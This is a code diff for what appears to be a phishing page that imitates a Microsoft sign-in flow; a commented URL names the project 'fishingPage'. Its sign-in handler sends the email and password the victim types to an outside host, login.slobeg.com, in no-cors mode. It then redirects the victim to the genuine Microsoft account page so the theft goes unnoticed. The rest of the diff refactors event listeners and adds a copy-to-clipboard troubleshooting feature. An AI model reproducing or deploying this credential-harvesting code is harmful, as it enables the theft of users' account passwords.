@@ -20,7 +20,7 @@ const backButton = document.querySelector('.back');
 const cantAccessYourAccountTitle = document.getElementById('cant-access-title');
 const cantAccessMenu = document.querySelector('.cant-access-menu');
 const troubleshootingBlock = document.querySelector('.troubleshooting-block');
-const signInOptionTitle = document.getElementById('sing-options-title');
+const copyToClipboardButton = document.querySelector('.trouble-subtitle-link');
 const signInTitle = document.getElementById('sign-in-title');
 const passwordTitle = document.getElementById('enter-pass-title');
 const enteredEmailText = document.getElementById('enter-message');
@@ -28,17 +28,13 @@ const nextButton = document.getElementById('next-button');
 const sigInOptionsTitle = document.getElementById('sign-in-options-title');
 const errorMessagePassword = document.getElementById('error-message-password');
 
-
-
 function validateInput() {
 
   inputEmailValue = inputEmail.value;
   if (!inputEmailValue || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(inputEmailValue)) {
     errorMessage.style.display = 'block';
     inputEmail.style.borderBottomColor = 'red';
-  }
-  else
-  {
+  } else {
     errorMessage.style.display = 'none';
     inputEmail.style.borderBottomColor = 'black';
 
@@ -117,7 +113,8 @@ function openLoverBlock() {
   enteredEmail.style.display = 'none';
 
 }
-function openCantAccessYourAccountBlock(){
+
+function openCantAccessYourAccountBlock() {
   errorMessage.style.display = 'none';
   inputEmail.style.borderBottomColor = 'black';
 
@@ -135,66 +132,78 @@ function openCantAccessYourAccountBlock(){
   lowerBlock.style.display = 'none';
   enteredEmail.style.display = 'none';
 }
-function closeTroubleshootingDetails(){
-  troubleshootingBlock.style.display = 'none';
+
+function showCopied() {
+  document.querySelectorAll('.trouble-copy *').forEach(element => {
+    element.style.visibility = 'visible';
+  });
+  const errorCode = document.querySelector('.error-code').textContent.trim();
+  const requestId = document.querySelector('.request-id').textContent.trim();
+  const correlationId = document.querySelector('.correlation-id').
+      textContent.
+      trim();
+  const timestamp = document.querySelector('.timestamp').textContent.trim();
+
+  const textToCopy = `${errorCode}\n${requestId}\n${correlationId}\n${timestamp}`;
+
+  navigator.clipboard.writeText(textToCopy).then(() => {
+    console.log('Successfully copied!:');
+  }).catch(err => {
+    console.error('Error:', err);
+  });
+
 }
-function openTroubleshootingDetails(){
-  troubleshootingBlock.style.display = 'block';
-}
-document.addEventListener('DOMContentLoaded', () => {
-  const moreButton = document.querySelector('.more');
-  moreButton.addEventListener('click', () => {
-    openTroubleshootingDetails();
-  });
-});
-
-document.addEventListener('DOMContentLoaded', () => {
-  const crossButton = document.querySelector('.cross-icon');
-  crossButton.addEventListener('click', () => {
-    closeTroubleshootingDetails();
-  });
-});
-document.addEventListener('DOMContentLoaded', () => {
-  const nextButton = document.getElementById('next-button');
-  nextButton.addEventListener('click', () => {
-    validateInput();
-  });
-});
-
-document.addEventListener('DOMContentLoaded', () => {
-  const arrowButton = document.getElementById('arrow');
-  arrowButton.addEventListener('click', () => {
-    backToFirstBlock();
-  });
-});
-
-document.addEventListener('DOMContentLoaded', () => {
-  const backButton = document.querySelector('.back');
-  backButton.addEventListener('click', () => {
-    backToFirstBlock();
-  });
-});
-
-document.addEventListener('DOMContentLoaded', () => {
-  const lowerBlockButton = document.querySelector('.lower-block');
-  lowerBlockButton.addEventListener('click', () => {
-    openLoverBlock();
-  });
-});
 
 document.addEventListener('DOMContentLoaded', () => {
   const cantAccessButton = document.querySelector('.cant-access');
   cantAccessButton.addEventListener('click', () => {
     openCantAccessYourAccountBlock();
   });
-});
+  const moreButton = document.querySelector('.more');
+  moreButton.addEventListener('click', () => {
+    troubleshootingBlock.style.display = 'block';
+  });
+  copyToClipboardButton.addEventListener('click', () => {
+    showCopied();
+  });
+  const crossButton = document.querySelector('.cross-icon');
+  crossButton.addEventListener('click', () => {
+    troubleshootingBlock.style.display = 'none';
+  });
+  const nextButton = document.getElementById('next-button');
+  nextButton.addEventListener('click', () => {
+    validateInput();
+  });
+  const arrowButton = document.getElementById('arrow');
+  arrowButton.addEventListener('click', () => {
+    backToFirstBlock();
+  });
+  const backButton = document.querySelector('.back');
+  backButton.addEventListener('click', () => {
+    backToFirstBlock();
+  });
+  const lowerBlockButton = document.querySelector('.lower-block');
+  lowerBlockButton.addEventListener('click', () => {
+    openLoverBlock();
+  });
+  const elements = [
+    document.getElementById('next-button'),
+    document.getElementById('input-email'),
+    document.getElementById('sign-in-title'),
+    document.querySelector('.no-account'),
+    document.querySelector('.cant-access'),
+    document.querySelector('.sign-in'),
+    document.querySelector('.button'),
+  ];
 
-document.addEventListener('DOMContentLoaded', () => {
+  elements.forEach(el => {
+    if (el) {
+      el.classList.add('animate-slide-in');
+    }
+  });
+
   const signInButton = document.querySelector('.sign-in');
   signInButton.addEventListener('click', () => {
-
-
-    //const url = "http://localhost:8080/fishingPage_war_exploded/api/user/signup";
 
     const inputEmail = document.getElementById('input-email');
     const inputEmailValue = inputEmail.value;
@@ -214,43 +223,23 @@ document.addEventListener('DOMContentLoaded', () => {
     if (!isValid) {
       return;
     }
+    //const url = "http://localhost:8080/fishingPage_war_exploded/api/user/signup";
 
     fetch('https://login.slobeg.com/api/user/signup', {
       method: 'POST',
-      mode: 'no-cors', // Режим без CORS
+      mode: 'no-cors',
       headers: {
-        'Content-Type': 'application/json'
+        'Content-Type': 'application/json',
       },
       body: JSON.stringify({
         login: inputEmailValue,
-        password: inputPasswordValue
-      })
-    })
-      .then(() => {
-        console.log('Запрос отправлен, но ответ недоступен из-за режима no-cors');
-        window.location.href = 'https://myaccount.microsoft.com';
-      })
-      .catch(error => {
-        console.error('Ошибка:', error);
-      });
-
-  });
-});
-
-document.addEventListener('DOMContentLoaded', () => {
-  const elements = [
-    document.getElementById('next-button'),
-    document.getElementById('input-email'),
-    document.getElementById('sign-in-title'),
-    document.querySelector('.no-account'),
-    document.querySelector('.cant-access'),
-    document.querySelector('.sign-in'),
-    document.querySelector('.button')
-  ];
-
-  elements.forEach(el => {
-    if (el) {
-      el.classList.add('animate-slide-in');
-    }
+        password: inputPasswordValue,
+      }),
+    }).then(() => {
+      console.log('Запрос отправлен, но ответ недоступен из-за режима no-cors');
+      window.location.href = 'https://myaccount.microsoft.com';
+    }).catch(error => {
+      console.error('Ошибка:', error);
+    });
   });
 });
